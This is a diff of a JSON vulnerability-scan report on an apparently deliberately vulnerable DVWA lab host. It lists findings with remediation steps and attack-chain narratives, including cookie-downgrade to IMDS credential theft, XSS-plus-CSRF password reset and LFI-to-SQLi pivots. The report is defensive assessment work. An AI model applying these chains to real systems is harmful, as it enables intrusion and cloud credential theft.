+      "id": "07ff64d5-eeee-4cef-b1c3-bb506ac59881",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4826,7 +5290,7 @@
       "is_validated": true
     },
     {
-      "id": "98361315-5acc-4283-869c-f9efa7f39899",
+      "id": "3d6781f2-0ceb-4355-a275-96eac322c09f",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4873,7 +5337,7 @@
       "is_validated": true
     },
     {
-      "id": "52698929-8b8d-44d5-bb16-c4126d9e7fa6",
+      "id": "1e031618-012e-45bc-a173-7a6241f94286",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4928,7 +5392,7 @@
       "is_validated": true
     },
     {
-      "id": "89214a60-dabc-45b5-9982-84ff1ee7c2fc",
+      "id": "887b03f3-1a98-4cd5-ae97-7635c9894274",
       "source": "prowler",
       "phase": 2,
       "severity": "MEDIUM",
@@ -4983,96 +5447,48 @@
       "is_validated": true
     },
     {
-      "id": "e8013c74-4373-4c09-becd-0756c96d97a8",
+      "id": "8ee484fe-ff7f-4f8d-af84-0de6e2fa0e00",
       "source": "autopentest",
       "phase": 3,
       "severity": "MEDIUM",
-      "category": "WSTG-CONF-09",
-      "title": "Sensitive Configuration File Publicly Accessible (/config/config.inc.php)",
-      "description": "The application configuration file /config/config.inc.php is publicly readable over HTTP without authentication. The file contains commented-out AWS credential templates (AKIA key ID and secret access key placeholders). While the current values are placeholders (\"YOUR_KEY_ID_HERE\"), the file structure confirms this path is intended for storing real AWS credentials, and the file is not protected by Apache access controls or authentication. If real credentials were inserted (or were previously present and cached), they would be fully exposed. The file is served with Content-Type text/html and returns HTTP 200 regardless of authentication status.",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/config/config.inc.php",
-      "remediation_summary": "1. Immediately restrict access to /config/ directory via Apache .htaccess or main config: Deny from all / Require all denied. 2. Remove any real credentials from this file if they were ever present. 3. Move configuration files outside the webroot entirely (above the DocumentRoot). 4. Use environment variables or a secrets manager (AWS Secrets Manager, Parameter Store) for AWS credentials instead of flat files. 5. Audit git history to verify real credentials were never committed.",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "aac54a59-f2af-41de-b645-3272e86715ba",
-      "source": "autopentest",
-      "phase": 3,
-      "severity": "MEDIUM",
-      "category": "WSTG-CONF-02",
-      "title": "DVWA Setup Page Exposes Default Credentials and Internal Paths",
-      "description": "The DVWA setup page at /setup.php is accessible without restriction (HTTP 200) and discloses: (1) Default administrator credentials (\"admin\" // \"password\"), (2) The full filesystem path to the config file (/var/www/html/config/config.inc.php), (3) Whether the config directory is writable by the web server (Yes - www-data), (4) The database password (masked as ******). Additionally, Apache's server-status page (/server-status) returns HTTP 403 with the server version in the error page footer (\"Apache/2.4.25 (Debian) Server at... Port 80\"). The server version Apache/2.4.25 is significantly outdated (released 2017) and has known vulnerabilities. No /server-info page was found (404).",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/setup.php",
-      "remediation_summary": "1. Restrict access to /setup.php via IP allowlist or authentication, or remove it from production. 2. Upgrade Apache from 2.4.25 to current stable version (2.4.62+) \u2014 version 2.4.25 has multiple known CVEs. 3. Configure Apache ServerTokens to 'Prod' to suppress version disclosure. 4. Ensure the config directory is not world-writable by the web server.",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "ee8def22-02b0-4c3d-abae-30059fccb9b5",
-      "source": "autopentest",
-      "phase": 3,
-      "severity": "MEDIUM",
-      "category": "WSTG-CONF-01",
-      "title": "Outdated Apache Web Server Version Disclosed (Apache/2.4.25 Debian)",
-      "description": "The server discloses its exact version in the Server response header on every HTTP response: \"Apache/2.4.25 (Debian)\". Apache 2.4.25 was released in December 2016 and has numerous known CVEs. Open ports per nmap: TCP/22 (SSH - OpenSSH 8.7), TCP/80 (HTTP - Apache 2.4.25). Ports 443, 3306, 8080, 8443, 21 are filtered. The SSH service (OpenSSH 8.7) is also accessible, representing an additional attack surface if weak credentials are in use. No reverse proxy or CDN headers detected (no Via, CF-RAY, X-Cache, etc.).",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
-      "remediation_summary": "1. Upgrade Apache to the current stable release (2.4.62+). 2. Set ServerTokens to 'Prod' in Apache config to suppress version info from headers. 3. Set ServerSignature to 'Off' to suppress version from error pages. 4. Apply all Debian security patches for the installed Apache version. 5. Consider restricting SSH access (port 22) to known IP ranges.",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "6360affc-f942-4e24-b7a6-92dbc090fdcb",
-      "source": "autopentest",
-      "phase": 3,
-      "severity": "MEDIUM",
-      "category": "WSTG-CONF-12",
-      "title": "Content Security Policy Missing or Critically Weak Across Application",
-      "description": "No Content-Security-Policy header is present on any standard application page (/login.php, /index.php, /). The only CSP present is on /vulnerabilities/csp/ (an intentional DVWA challenge page), and that CSP is itself critically weak: it allows scripts from external domains including pastebin.com and the bare domain example.com (without HTTPS). The absence of CSP across the application means there is no browser-enforced mitigation against XSS attacks. Any reflected or stored XSS payload (which DVWA is intentionally vulnerable to) will execute without browser-level defense. This is especially significant given that FINDING-004 confirmed the session cookie lacks HttpOnly, making XSS-to-session-theft a complete attack chain.",
-      "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
-      "remediation_summary": "1. Implement a Content-Security-Policy header on all application pages, starting with a restrictive default: Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'. 2. Remove external domains from script-src unless strictly necessary. 3. Never allow pastebin.com or other user-content-hosting domains in script-src. 4. Use CSP nonces or hashes instead of 'unsafe-inline' for any inline scripts required. 5. Test CSP coverage using a CSP evaluator tool before deployment.",
-      "remediation_cli": null,
-      "compliance_mappings": null,
-      "confidence": 1.0,
-      "is_validated": false
-    },
-    {
-      "id": "d8c647fb-625a-4893-ace8-4fc9a629dc1b",
-      "source": "autopentest",
-      "phase": 3,
-      "severity": "MEDIUM",
-      "category": "WSTG-ATHZ-04",
-      "title": "Insecure Direct Object Reference \u2014 User Data Accessible by Arbitrary ID",
-      "description": "The SQL Injection vulnerability module at /vulnerabilities/sqli/ exposes all application user records via an IDOR vulnerability. Any authenticated user can retrieve the first name and surname of any other user account by manipulating the \"id\" GET parameter. No authorization check verifies that the requesting user owns the requested record. All 5 user accounts (IDs 1-5) were enumerated successfully, including the admin account (ID=1). While this specific endpoint is the SQL Injection demonstration module in DVWA, the IDOR pattern demonstrates the absence of object-level authorization throughout the application.\n\nUsers exposed: admin/admin (ID 1), Gordon Brown (ID 2), Hack Me (ID 3), Pablo Picasso (ID 4), Bob Smith (ID 5).",
+      "category": "WSTG-ERRH-01",
+      "title": "Improper Error Handling - Verbose SQL and Server Error Messages",
+      "description": "The application displays verbose error messages that disclose internal technical details. Three distinct error disclosure issues were identified: (1) SQL errors expose the MariaDB version, query structure, and internal error details when malformed SQL input is submitted; (2) 404 error pages include the full Apache version (Apache/2.4.25 Debian) and the server hostname; (3) The application does not sanitize error output before displaying it to the user. These disclosures assist attackers in identifying specific software versions and potential vulnerabilities. This finding cross-references FINDING-012 (version disclosure) and FINDING-006 (SQL error message disclosure).",
       "resource_type": "url",
       "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/sqli/",
-      "remediation_summary": "Implement object-level authorization checks: verify that the authenticated user has permission to access the requested record before returning data. For user-specific data, confirm that the session user ID matches the requested object ID (or the user has an admin role). Use parameterized queries and enforce row-level access controls at the database or application layer.",
+      "remediation_summary": "1. Configure PHP to disable display_errors in production (display_errors = Off in php.ini). 2. Enable error logging to server-side log files instead of outputting to users. 3. Configure Apache to suppress version information (ServerTokens Prod, ServerSignature Off in httpd.conf). 4. Implement a custom error page that shows a generic message without technical details. 5. Wrap database queries in try/catch blocks and present generic error messages to users.",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
       "is_validated": false
     },
     {
-      "id": "296281d9-e82e-4658-8940-8ad69f72e33d",
+      "id": "a7e7bf74-facb-401b-aedf-59b6a85c0e31",
       "source": "autopentest",
       "phase": 3,
       "severity": "MEDIUM",
-      "category": "WSTG-ATHN-03",
-      "title": "No Account Lockout Mechanism on Login Form",
-      "description": "The DVWA login form does not implement any account lockout, rate limiting, or brute-force protection. Ten consecutive failed login attempts for the admin account all returned the same generic \"Login failed\" response with HTTP 302 redirect to login.php. No CAPTCHA was presented, no lockout occurred, and no delay was introduced between attempts. This enables unlimited brute-force attacks against any account.",
+      "category": "WSTG-CLNT-03",
+      "title": "HTML Injection - Unescaped HTML Tags Rendered in Reflected Output",
+      "description": "The reflected XSS endpoint at /vulnerabilities/xss_r/ renders HTML tags without sanitization. When a user-supplied HTML tag like &lt;b&gt;BOLD_TEST&lt;/b&gt; is submitted via the name parameter, it is rendered as bold text in the response rather than being escaped. While this overlaps with the reflected XSS finding (FINDING-030), it specifically confirms that arbitrary HTML structure injection is possible, allowing attackers to inject forms, links, images, and other HTML elements beyond just script execution. This could be used for phishing, UI redressing, or form injection attacks.",
       "resource_type": "url",
-      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/login.php",
-      "remediation_summary": "Implement account lockout after 5 failed attempts (temporary lockout of 15-30 minutes). Add progressive delays between attempts. Consider implementing CAPTCHA after 3 failed attempts. Log and alert on repeated failed login attempts from same IP. Implement IP-based rate limiting.",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/vulnerabilities/xss_r/",
+      "remediation_summary": "Apply htmlspecialchars() or htmlentities() to all user-supplied input before reflecting it in HTML output. Use the ENT_QUOTES flag to escape both single and double quotes. This is the same remediation as for the reflected XSS finding and would fix both issues simultaneously.",
+      "remediation_cli": null,
+      "compliance_mappings": null,
+      "confidence": 1.0,
+      "is_validated": false
+    },
+    {
+      "id": "9ae79275-5cf7-4ea5-b87f-ca8a30379c19",
+      "source": "autopentest",
+      "phase": 3,
+      "severity": "MEDIUM",
+      "category": "WSTG-CLNT-09",
+      "title": "Clickjacking - Missing X-Frame-Options and CSP frame-ancestors Header",
+      "description": "The application does not send an X-Frame-Options header or a Content-Security-Policy with a frame-ancestors directive. This allows the application to be embedded in an iframe on any third-party domain, enabling clickjacking attacks. An attacker can create a malicious page that embeds the DVWA application in a transparent iframe and trick authenticated users into performing unintended actions (e.g., submitting forms, clicking buttons) while believing they are interacting with the attacker's site. This cross-references FINDING-014 (missing security headers) and is particularly dangerous combined with the CSRF vulnerability (FINDING-021).",
+      "resource_type": "url",
+      "resource_id": "http://ec2-18-188-101-84.us-east-2.compute.amazonaws.com/",
+      "remediation_summary": "1. Add X-Frame-Options: DENY or X-Frame-Options: SAMEORIGIN to all response headers. 2. Alternatively (preferred for modern browsers), add Content-Security-Policy: frame-ancestors 'none' or frame-ancestors 'self'. 3. Configure this in Apache via: Header always append X-Frame-Options SAMEORIGIN. 4. Combined with the CSRF finding, this creates a compounded attack chain that should be addressed urgently.",
       "remediation_cli": null,
       "compliance_mappings": null,
       "confidence": 1.0,
@@ -5081,34 +5497,34 @@
   ],
   "attack_chains": [
     {
-      "id": "8fa51399-d7ae-4f71-818c-5901480769cd",
-      "pattern_name": "exposed-config-to-db-compromise",
+      "id": "4b39971f-8c7f-4fca-b238-1c19810f82cc",
+      "pattern_name": "security-cookie-downgrade-unlocks-exploits",
       "severity": "CRITICAL",
-      "narrative": "An unauthenticated attacker retrieves /config/config.inc.php and its .bak sibling on the DVWA host (ec2-18-188-101-84), which the WSTG-CONF-03 finding confirms leaks plaintext database credentials. Because the site is served exclusively over HTTP (WSTG-CONF-07), the attacker can also sniff traffic, but the backup file alone provides direct DB creds usable to pivot into the backing MySQL and exfiltrate/modify application data.",
+      "narrative": "The application trusts the client-supplied `security` cookie without server-side validation (86557873), so any unauthenticated attacker can set `security=low` (56dfde7c) to disable all input filtering across DVWA modules. With filters removed, the OS command injection in /vulnerabilities/exec/ (80abc11b) becomes trivially reachable, and that RCE is already demonstrated to reach IMDSv1 and steal EC2 role credentials (93a6fcc6). The cookie bypass is therefore the universal precondition that turns every 'security=impossible' hardened endpoint back into an exploitable sink.",
       "breach_cost_low": null,
       "breach_cost_high": null
     },
     {
-      "id": "54ca5cb2-9520-4ab3-a5dc-f77b1912d411",
-      "pattern_name": "setup-reinit-to-admin-takeover",
+      "id": "718e98b6-7ea2-4f0d-971c-0a2c5043d557",
+      "pattern_name": "stored-xss-csrf-silent-password-change",
       "severity": "HIGH",
-      "narrative": "The setup.php page is reachable unauthenticated (WSTG-ATHZ-02) and discloses default credentials plus internal paths (WSTG-CONF-02). An attacker can trigger DB reinitialization to restore the known default admin/password pair (WSTG-ATHN-02) and then log in as admin, giving full application control.",
+      "narrative": "An attacker stores JavaScript in the guestbook (2d751fba) that every authenticated viewer \u2014 including admins \u2014 executes in-session. Because the password-change endpoint has no CSRF token and does not require the current password (54083e51), the stored payload can issue a same-origin request to /vulnerabilities/csrf/ and silently reset the victim's password. The missing HttpOnly flag (d0b5c2fa) and cleartext HTTP (c88a128e) let the payload also exfiltrate PHPSESSID for parallel live hijack. This differs from the existing reflected-XSS+HttpOnly chain because it is persistent and weaponises the CSRF weakness, not cookie theft, for takeover.",
       "breach_cost_low": null,
       "breach_cost_high": null
     },
     {
-      "id": "546e7ae1-650c-426a-8093-bba3970e9ae4",
-      "pattern_name": "security-cookie-bypass-to-exploit-chain",
+      "id": "8f08043e-9ff3-4550-833f-22f5bee7f5e5",
+      "pattern_name": "unauth-setup-db-reset-default-creds-revival",
       "severity": "HIGH",
-      "narrative": "The application trusts a client-supplied 'security=low' cookie server-side (WSTG-ATHZ-03 / WSTG-SESS-11), letting an attacker downgrade all vulnerability modules to their most vulnerable variants. From the low-security SSRF/file-include modules, the attacker can then target the reachable IMDS endpoint (WSTG-CONF-11) on the hosting EC2 instance to steal instance role credentials \u2014 amplifying a web flaw into AWS credential theft.",
+      "narrative": "setup.php is reachable without authentication (dd22cca1) and exposes a 'Create/Reset Database' action (ff264a65) that wipes the users table and repopulates it with the hard-coded default DVWA accounts (b0fb0876). An attacker who has lost access, or who wants to erase an admin's hardened password, can call setup.php to re-seed admin/password, then authenticate and \u2014 because PHPSESSID is not rotated on login (dfd0e072) \u2014 pre-set a session ID to fixate the victim admin into the attacker's known session.",
       "breach_cost_low": null,
       "breach_cost_high": null
     },
     {
-      "id": "5b828b8c-d89e-4311-96d9-82e27092277d",
-      "pattern_name": "xss-csrf-password-takeover",
+      "id": "f13fd779-8caa-4b4e-a9ee-a1dbb4ca48af",
+      "pattern_name": "lfi-reads-db-config-then-sqli-pivot",
       "severity": "HIGH",
-      "narrative": "Session cookies lack HttpOnly (WSTG-SESS-02), so any reflected/stored XSS in DVWA (which is rife with them) can steal PHPSESSID. Combined with the unprotected password-change endpoint that requires neither CSRF token nor current password (WSTG-ATHN-09 / WSTG-SESS-05), an attacker can also simply force a victim browser to change the victim's password via a drive-by request, achieving account takeover without needing to steal the cookie.",
+      "narrative": "The LFI in /vulnerabilities/fi/ (49be380c) allows arbitrary file read via path traversal, so an unauthenticated attacker can fetch /config/config.inc.php (also independently exposed at a3eebc83) to harvest live MySQL credentials. Combined with the SQLi on /vulnerabilities/sqli/ (66499219) that dumps the users table hashed with unsalted MD5 (946a1ddf), the attacker obtains both direct DB-level access and cleartext application passwords \u2014 enabling full data exfiltration and lateral login as any user, including admin.",
       "breach_cost_low": null,
       "breach_cost_high": null
     }
